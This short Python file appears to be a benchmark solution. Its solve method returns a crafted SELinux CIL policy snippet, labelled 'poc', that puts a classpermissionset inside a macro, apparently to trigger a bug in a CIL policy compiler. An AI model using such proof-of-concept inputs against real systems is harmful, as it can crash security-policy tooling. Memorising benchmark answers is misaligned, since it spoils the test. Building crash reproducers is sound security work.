class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = """(class file)
(permission read write)
(type user_t)
(type user_file_t)
(role user_r)
(macro mymacro ((cp classpermission))
  (classpermissionset myset $cp)
  (allow user_t user_file_t myset)
)
(mymacro (file (read write)))
"""
        return poc.encode('ascii')